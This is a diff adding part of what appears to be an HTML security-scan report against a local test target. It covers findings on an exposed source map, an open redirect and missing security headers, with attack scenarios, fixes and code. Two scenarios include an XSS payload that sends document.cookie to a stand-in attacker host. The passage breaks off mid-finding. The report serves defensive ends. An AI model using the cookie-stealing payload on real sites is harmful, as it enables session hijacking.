+# Never expose Werkzeug&#x27;s interactive debugger:
+app.run(debug=False, host=&#x27;127.0.0.1&#x27;)
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noopener">CWE-200</a></li>
+<li>OWASP A01:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-1C2A6D">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ca8a04;">Medium</span>
+<h3>Exposed Source Map File</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-1C2A6D</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/api/source-map</code>
+<br><strong>Parameter:</strong> <code>body</code>
+<br><strong>Input used:</strong> <code>/api/source-map</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>A JavaScript source map file (`*.js.map`) is publicly accessible. Source maps translate minified production code back to the original source — including comments, internal variable names, and unreleased features. An attacker who fetches the map sees your application as if it were open source.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Modern build tools (Webpack, Vite, esbuild, Rollup) generate source maps by default. They map positions in the minified production bundle back to lines in the original TypeScript or JavaScript. The `sourcesContent` array in the map contains the full original source. When deployed, attackers fetch the map and reconstruct comments, function names, dead code paths, and internal API URLs. Source maps should never be deployed to production — they should only be uploaded to error-tracking services (Sentry, Bugsnag) for stack-trace symbolication.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker loads the application, opens DevTools, finds `/static/js/main.bundle.js`</li>
+<li>Attacker fetches `/static/js/main.bundle.js.map` — returns 200 OK</li>
+<li>Attacker reads the `sourcesContent` array — full original TypeScript source</li>
+<li>Attacker finds comments like `// TODO: remove admin backdoor in v2.5`, internal endpoint URLs (`/api/internal/users`), hard-coded test credentials, or feature flags for unreleased features</li>
+<li>Attacker exploits the discovered information — calls the internal endpoint, uses the credentials, or accesses an unfinished feature</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Full source code disclosure of the JavaScript bundle. While the minified code is already public (the bundle ships to every browser), the source map adds comments, variable names, and internal structure. Common leaks: API keys committed by developers, internal-only endpoints, hard-coded test credentials, comments referencing planned security controls or known issues. For applications with TypeScript types, the map can reveal the entire type system.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-1C2A6D-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Do not deploy source maps to production. In Webpack: `devtool: &#x27;hidden-source-map&#x27;` uploads the map to your error tracker but does not reference it from the bundle.</li>
+<li>Or strip the `sourceMappingURL` comment from the production output: `devtool: false` or use `TerserPlugin` with `sourceMap: false`.</li>
+<li>Block `.map` files at the web server: `location ~* \.map$ { deny all; return 404; }`.</li>
+<li>If source maps must be accessible for debugging, restrict access via authentication or a private CDN accessible only to your error-tracking service.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>webpack</h5>
+<pre class="code-block"><code>
+// webpack.config.js
+module.exports = {
+  // Production: do not bundle source map into output
+  devtool: false,
+  // Or: upload to Sentry without serving to clients
+  devtool: &#x27;hidden-source-map&#x27;,
+  plugins: [new SentryWebpackPlugin({ ... })],
+};
+</code></pre>
+<h5>vite</h5>
+<pre class="code-block"><code>
+// vite.config.ts
+export default defineConfig({
+  build: {
+    sourcemap: false,  // or &#x27;hidden&#x27; for error tracker only
+  }
+});
+</code></pre>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+location ~* \.map$ {
+    deny all;
+    return 404;
+}
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+&lt;FilesMatch &quot;\.map$&quot;&gt;
+    Require all denied
+&lt;/FilesMatch&gt;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+app.use((req, res, next) =&gt; {
+  if (/\.map$/.test(req.path)) return res.status(404).end();
+  next();
+});
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noopener">CWE-200</a></li>
+<li>OWASP A01:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-9651D6">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#16a34a;">Low</span>
+<h3>Potential Open Redirect via &#x27;to&#x27; Parameter</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-9651D6</code></span>
+<span class="meta-item"><strong>Status:</strong> LIKELY</span>
+<span class="meta-item"><strong>Confidence:</strong> LOW</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/redirect</code>
+<br><strong>Parameter:</strong> <code>to</code>
+<br><strong>Input used:</strong> <code>https://example.com</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>An endpoint accepts a redirect-target parameter (`next`, `url`, `redirect`, `return`, `goto`, etc.) without server-side validation. If exploited, an attacker can craft a link on the trusted domain that redirects victims to a phishing or malware site — bypassing URL filters and user trust signals.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Open redirects exploit authentication flows that use a `returnTo` or `next` parameter after login. The application redirects to whatever URL the user supplies, with no validation. Because the initial URL is on the trusted domain, link previewers and email scanners see only the trusted host. The victim clicks, is briefly redirected to the trusted domain, then sent to the attacker&#x27;s site. Open redirects are routinely used in OAuth flows to hijack authorization codes, in phishing campaigns to make links look legitimate, and in tab-nabbing scenarios.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker crafts `https://target.example/login?next=https://evil.example/fake-login`</li>
+<li>Attacker distributes the link: &#x27;Click here to verify your account on target.example&#x27;</li>
+<li>Victim clicks, lands on target.example&#x27;s real login page, enters credentials, gets redirected to evil.example</li>
+<li>evil.example renders a target.example lookalike saying &#x27;Session expired, please re-enter your password&#x27;</li>
+<li>Victim enters credentials — captured by attacker</li>
+<li>Attacker uses credentials to log in to the real target.example — account takeover</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Phishing leverage: any link on the trusted domain can land the victim on an attacker-controlled page. OAuth flow abuse: if the OAuth `redirect_uri` is not validated, the attacker captures the authorization code. Tab-nabbing: a link opened in a new tab can rewrite the original tab via window.opener. The combination with OAuth is the most damaging — full account takeover via stolen authorization code.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-9651D6-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Validate redirect targets against an allowlist of internal paths (e.g. only redirect to paths starting with `/` on your own domain).</li>
+<li>Use signed/encrypted tokens for redirect targets so the URL itself cannot be modified by an attacker.</li>
+<li>If external redirects are needed, present an interstitial page warning the user they are leaving the trusted domain.</li>
+<li>For OAuth, validate `redirect_uri` strictly — only allow pre-registered URIs; reject wildcards and partial matches.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>flask</h5>
+<pre class="code-block"><code>
+from urllib.parse import urlparse
+ALLOWED_HOSTS = {&#x27;target.example.com&#x27;}
+@app.route(&#x27;/login&#x27;)
+def login():
+    next_url = request.args.get(&#x27;next&#x27;, &#x27;/&#x27;)
+    p = urlparse(next_url)
+    if p.scheme or p.netloc:  # absolute URL — reject
+        return &#x27;invalid redirect&#x27;, 400
+    if not next_url.startswith(&#x27;/&#x27;):
+        next_url = &#x27;/&#x27; + next_url
+    return redirect(next_url)
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+from django.utils.http import url_has_allowed_host_and_scheme
+def safe_redirect(request):
+    nxt = request.GET.get(&#x27;next&#x27;, &#x27;/&#x27;)
+    if url_has_allowed_host_and_scheme(nxt, allowed_hosts={request.get_host()}, require_https=request.is_secure()):
+        return redirect(nxt)
+    return redirect(&#x27;/&#x27;)
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+function safeRedirect(req, res, next) {
+  const nxt = req.query.next || &#x27;/&#x27;;
+  if (/^\/[\w/-]*$/.test(nxt)) {
+    return res.redirect(nxt);
+  }
+  return res.redirect(&#x27;/&#x27;);
+}
+</code></pre>
+<h5>oauth</h5>
+<pre class="code-block"><code>
+# OAuth: validate redirect_uri strictly
+ALLOWED_REDIRECTS = {&#x27;https://app.example.com/callback&#x27;}
+if redirect_uri not in ALLOWED_REDIRECTS:
+    return error(&#x27;invalid redirect_uri&#x27;)
+</code></pre>
+<h5>interstitial</h5>
+<pre class="code-block"><code>
+# If external redirects must be allowed, use an interstitial:
+&lt;a href=&quot;/leave?u=https://external.example&quot;&gt;Leave site&lt;/a&gt;
+# /leave renders: &#x27;You are about to visit https://external.example&#x27;
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601</a></li>
+<li>OWASP A01:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-53C1BC">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ca8a04;">Medium</span>
+<h3>Missing Content-Security-Policy Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-53C1BC</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>content-security-policy</code>
+<br><strong>Input used:</strong> <code>(not set)</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The Content-Security-Policy header is absent, leaving the application without a server-side policy that defines which scripts, styles, images, frames, and connections the browser should trust. Without CSP, any XSS bug becomes immediately exploitable and the blast radius of a single injection grows.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Content-Security-Policy is a defense-in-depth header that whitelists the origins from which resources can be loaded and inline content that can execute. Modern browsers enforce CSP at parse time: a script tag whose source does not match the policy is blocked before it runs. CSP cannot fix an XSS bug, but it raises the cost of exploitation by forcing an attacker to either find a JSONP endpoint, abuse an allowed CDN, or compromise an allowed origin. Absent CSP, every stored, reflected, or DOM-based XSS sinks directly into the user&#x27;s session.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker discovers a reflected XSS in https://target.example/search?q=</li>
+<li>Attacker crafts a link `https://target.example/search?q=&lt;script&gt;fetch(&#x27;//evil.example/?c=&#x27;+document.cookie)&lt;/script&gt;`</li>
+<li>Attacker distributes the link via email, Slack, or social media</li>
+<li>Victim clicks the link while authenticated to target.example</li>
+<li>With CSP absent, the inline &lt;script&gt; executes and exfiltrates the session cookie to evil.example</li>
+<li>Attacker replays the cookie and impersonates the victim</li>
+<li>With a strict CSP (e.g. `script-src &#x27;self&#x27;`) the inline script is blocked at parse time and the attack fails</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Without CSP every XSS vulnerability is a direct credential theft or account takeover vector. CSP also limits the impact of clickjacking (via `frame-ancestors`), mixed-content issues (via `block-all-mixed-content`), and unauthorized iframe embedding. Absence of CSP increases the severity of any other client-side vulnerability and is a meaningful compliance gap (PCI-DSS, NIST 800-53 SC-18).</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-53C1BC-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Add a strict CSP starting with `Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;self&#x27;`.</li>
+<li>Avoid `unsafe-inline` and `unsafe-eval` — they disable the primary XSS-mitigation benefit of CSP. If you must allow inline scripts, switch to nonces or hashes (`script-src &#x27;nonce-{random}&#x27;`).</li>
+<li>Deploy in Report-Only mode first (`Content-Security-Policy-Report-Only`) to collect violations before enforcing.</li>
+<li>Use `report-uri` or `report-to` to send violation reports to a logging endpoint for monitoring.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+add_header Content-Security-Policy &quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;self&#x27;&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+Header always set Content-Security-Policy &quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+const helmet = require(&#x27;helmet&#x27;);
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: [&quot;&#x27;self&#x27;&quot;],
+    scriptSrc: [&quot;&#x27;self&#x27;&quot;],
+    objectSrc: [&quot;&#x27;none&#x27;&quot;],
+    frameAncestors: [&quot;&#x27;none&#x27;&quot;],
+  }
+}));
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+from flask_talisman import Talisman
+Talisman(app, content_security_policy={
+    &#x27;default-src&#x27;: &quot;&#x27;self&#x27;&quot;,
+    &#x27;script-src&#x27;: &quot;&#x27;self&#x27;&quot;,
+    &#x27;object-src&#x27;: &quot;&#x27;none&#x27;&quot;,
+    &#x27;frame-ancestors&#x27;: &quot;&#x27;none&#x27;&quot;
+})
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+# settings.py
+CSP_DEFAULT_SRC = (&quot;&#x27;self&#x27;&quot;,)
+CSP_SCRIPT_SRC = (&quot;&#x27;self&#x27;&quot;,)
+CSP_OBJECT_SRC = (&quot;&#x27;none&#x27;&quot;,)
+CSP_FRAME_ANCESTORS = (&quot;&#x27;none&#x27;&quot;,)
+# install django-csp and add its middleware
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/1021.html" target="_blank" rel="noopener">CWE-1021</a></li>
+<li>OWASP A05:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-E0FBC4">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ca8a04;">Medium</span>
+<h3>Missing X-Frame-Options Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-E0FBC4</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>x-frame-options</code>
+<br><strong>Input used:</strong> <code>(not set)</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The X-Frame-Options header is not set, which means the response can be embedded inside a &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt;, or &lt;object&gt; on any other website. This enables clickjacking attacks where victims are tricked into clicking hidden elements rendered in their authenticated session.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Browsers consult the X-Frame-Options header (and the modern Content-Security-Policy ``frame-ancestors`` directive) to decide whether a page may be rendered inside a frame on another origin. When neither is present, browsers default to allowing framing from any origin. An attacker hosts your application inside an invisible iframe overlaid with attacker-controlled UI; the victim interacts with the framed page believing they are interacting with the attacker&#x27;s surface, but every action executes inside their authenticated session on your application.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Attacker hosts a page at https://evil.example with an invisible iframe pointing to https://target.example/account/settings</li>
+<li>The iframe is styled with opacity:0.001 and overlaid with a decoy UI such as a fake captcha or &#x27;Watch Video&#x27; button</li>
+<li>Victim visits https://evil.example while logged into target.example in the same browser</li>
+<li>Victim clicks what appears to be &#x27;Watch Video&#x27; but is actually the &#x27;Delete Account&#x27; button underneath</li>
+<li>The destructive action executes in the victim&#x27;s authenticated session and the victim never sees anything wrong</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Clickjacking can be used to trick users into making unwanted financial transfers, changing account settings (recovery email, password, 2FA), granting OAuth or app permissions, deleting data, or following/unfollowing accounts. Severity escalates significantly when the framed page contains state-changing forms and the application lacks CSRF protection, because the click is interpreted as an intentional user action.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-E0FBC4-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Add the header `X-Frame-Options: DENY` (most restrictive) or `SAMEORIGIN` if you legitimately embed your own pages in frames.</li>
+<li>Prefer the modern equivalent: Content-Security-Policy with `frame-ancestors &#x27;none&#x27;` or `frame-ancestors &#x27;self&#x27;`. CSP frame-ancestors supersedes X-Frame-Options in all modern browsers.</li>
+<li>Combine with a same-origin check on every state-changing form: if the request&#x27;s Origin or Referer does not match your application, reject it (defense in depth against CSRF).</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+add_header X-Frame-Options &quot;SAMEORIGIN&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+Header always set X-Frame-Options &quot;SAMEORIGIN&quot;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+app.use((req, res, next) =&gt; {
+  res.setHeader(&#x27;X-Frame-Options&#x27;, &#x27;SAMEORIGIN&#x27;);
+  next();
+});
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+from flask import Flask
+app = Flask(__name__)
+@app.after_request
+def set_xfo(resp):
+    resp.headers[&#x27;X-Frame-Options&#x27;] = &#x27;SAMEORIGIN&#x27;
+    return resp
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+# settings.py — use django-security or set in middleware:
+SECURE_CONTENT_TYPE_NOSNIFF = True
+X_FRAME_OPTIONS = &#x27;SAMEORIGIN&#x27;  # django &gt;= 4.0
+# Or install django-security and add:
+# &#x27;security.middleware.XFrameOptionsMiddleware&#x27;
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/1021.html" target="_blank" rel="noopener">CWE-1021</a></li>
+<li>OWASP A05:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-983F39">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#16a34a;">Low</span>
+<h3>Missing X-Content-Type-Options Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-983F39</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>x-content-type-options</code>
+<br><strong>Input used:</strong> <code>(not set)</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The X-Content-Type-Options header is not set, allowing browsers to perform MIME-sniffing on responses. A text/plain response that the server intended as harmless text could be reinterpreted by the browser as HTML or JavaScript, enabling stored XSS even on endpoints that carefully set Content-Type.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Browsers perform &#x27;MIME sniffing&#x27; to guess the actual content type when the declared Content-Type is missing, generic (text/plain), or inconsistent with the response body. An attacker who can upload or store content via a text-typed endpoint can craft a payload that sniffs as HTML and executes scripts in the application&#x27;s origin. Setting `X-Content-Type-Options: nosniff` instructs the browser to strictly honor the declared Content-Type and refuse to sniff.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Application accepts user-uploaded text and stores it; serves it back with `Content-Type: text/plain`</li>
+<li>Attacker uploads a payload that begins with HTML (e.g. `&lt;script&gt;fetch(&#x27;//evil.example/?c=&#x27;+document.cookie)&lt;/script&gt;`)</li>
+<li>Victim views the page; without nosniff the browser sniffs the body as HTML and executes the script</li>
+<li>Attacker&#x27;s script runs in the application&#x27;s origin and exfiltrates cookies or makes credentialed requests</li>
+<li>With `nosniff`, the browser would render the response as plaintext and the script would never execute</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Stored XSS via MIME confusion — bypasses many application-level defenses because the developer believes the endpoint is &#x27;just text&#x27;. Combined with a permissive CORS or same-origin XHR, attackers can read or modify sensitive data within the application&#x27;s origin.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-983F39-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Add `X-Content-Type-Options: nosniff` to every response that serves user-controlled or untrusted content.</li>
+<li>Audit upload endpoints to ensure the server-supplied Content-Type matches the actual content (or set Content-Disposition to force download).</li>
+<li>Pair with a strong Content-Security-Policy so that even if a sniffing bypass succeeds, the inline script cannot run.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+add_header X-Content-Type-Options &quot;nosniff&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+Header always set X-Content-Type-Options &quot;nosniff&quot;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+app.use((req, res, next) =&gt; {
+  res.setHeader(&#x27;X-Content-Type-Options&#x27;, &#x27;nosniff&#x27;);
+  next();
+});
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+@app.after_request
+def nosniff(resp):
+    resp.headers[&#x27;X-Content-Type-Options&#x27;] = &#x27;nosniff&#x27;
+    return resp
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+SECURE_CONTENT_TYPE_NOSNIFF = True  # in settings.py
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/693.html" target="_blank" rel="noopener">CWE-693</a></li>
+<li>OWASP A05:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-D36C95">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#ca8a04;">Medium</span>
+<h3>Missing Strict-Transport-Security Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-D36C95</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>strict-transport-security</code>
+<br><strong>Input used:</strong> <code>(not set)</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The Strict-Transport-Security header is not set, so browsers will not enforce HTTPS for this domain. A network attacker on the same Wi-Fi, performing a man-in-the-middle attack, can intercept the first request to the site and serve HTTP content, capture session cookies, or inject content.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>HSTS tells the browser: &#x27;for this domain, never speak HTTP — always use HTTPS for the next N seconds.&#x27; On the first visit, the browser sees the HSTS header on an HTTPS response and pins the policy for `max-age` seconds. On subsequent visits, even if the user types `http://` or clicks an `http://` link, the browser silently upgrades to HTTPS before issuing the request. Without HSTS, an attacker who intercepts the very first request — or any request after the policy expires — can serve content over HTTP, strip TLS, or redirect to a phishing site. This is the classic sslstrip attack vector.</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Victim joins coffee-shop Wi-Fi. Attacker on same network runs an ARP-spoofing / sslstrip tool</li>
+<li>Victim types `target.example` in the address bar — no scheme, browser tries HTTP first</li>
+<li>Attacker intercepts the plaintext HTTP request, strips the redirect-to-HTTPS, and proxies to the real site over HTTPS while serving an HTTP response to the victim</li>
+<li>Victim logs in: attacker captures credentials or session cookies in plaintext</li>
+<li>With HSTS `max-age=31536000` set on a previous session, the browser would have refused the HTTP request and upgraded to HTTPS before any attacker-controlled hop</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Credential theft via sslstrip, session hijacking, and forced downgrade to plaintext HTTP. Particularly damaging for sites that set session cookies without the Secure flag — those cookies leak in plaintext over the intercepted HTTP. HSTS also protects against cookie theft via misconfigured TLS terminators and stray http:// links in legacy systems.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-D36C95-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to every HTTPS response.</li>
+<li>`max-age` of at least 1 year (31536000) is recommended; less than 6 months is flagged by security headers scanners.</li>
+<li>Submit your domain to the HSTS preload list (https://hstspreload.org) so the policy is baked into browsers before the first visit.</li>
+<li>Ensure all subdomains serve HTTPS — `includeSubDomains` is dangerous if any subdomain is HTTP-only.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+Header always set Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+app.use((req, res, next) =&gt; {
+  res.setHeader(
+    &#x27;Strict-Transport-Security&#x27;,
+    &#x27;max-age=31536000; includeSubDomains; preload&#x27;
+  );
+  next();
+});
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+from flask_talisman import Talisman
+Talisman(app, strict_transport_security=True, strict_transport_security_max_age=31536000, strict_transport_security_include_subdomains=True, strict_transport_security_preload=True)
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+# settings.py
+SECURE_HSTS_SECONDS = 31536000
+SECURE_HSTS_INCLUDE_SUBDOMAINS = True
+SECURE_HSTS_PRELOAD = True
+# Requires SECURE_SSL_REDIRECT = True and SECURE_PROXY_SSL_HEADER
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/319.html" target="_blank" rel="noopener">CWE-319</a></li>
+<li>OWASP A05:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-7D85A3">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#16a34a;">Low</span>
+<h3>Missing Referrer-Policy Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-7D85A3</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>referrer-policy</code>
+<br><strong>Input used:</strong> <code>(not set)</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The Referrer-Policy header is set to `unsafe-url` or `no-referrer-when-downgrade`, allowing the browser to send the full URL of the current page (including path and query parameters) to any external site the user navigates to. Query parameters often contain session tokens, search terms, or other sensitive data.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>When a user clicks an outbound link or loads an external resource, the browser sends the Referer header — the URL of the current page. `unsafe-url` sends the full URL regardless of protocol. `no-referrer-when-downgrade` sends the full URL to any destination as long as the destination is HTTPS (or HTTP, matching the source). Both leak sensitive path/query information. Safer values are `strict-origin-when-cross-origin` (default in modern browsers), `same-origin` (only same-origin requests get the full URL), or `no-referrer` (never send).</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Application uses URL parameters to pass state, e.g. `/reset-password?token=abc123`</li>
+<li>Application does not set Referrer-Policy, so the browser defaults to `strict-origin-when-cross-origin` (or worse, an unsafe value)</li>
+<li>Victim loads the page, then clicks an outbound link to any third-party site (a forum, a help doc, etc.)</li>
+<li>The third-party site receives `Referer: https://target.example/reset-password?token=abc123`</li>
+<li>If the third party is malicious or compromised, the reset token is now in the access logs</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Leakage of sensitive URL parameters (password reset tokens, internal search queries, file paths, debug flags) to any external destination the user visits. Many analytics platforms, ad networks, and partner sites collect Referer headers as a matter of routine — the data spreads quickly beyond your control.</p>
+</section>
+<section>
+<h4>Evidence</h4>
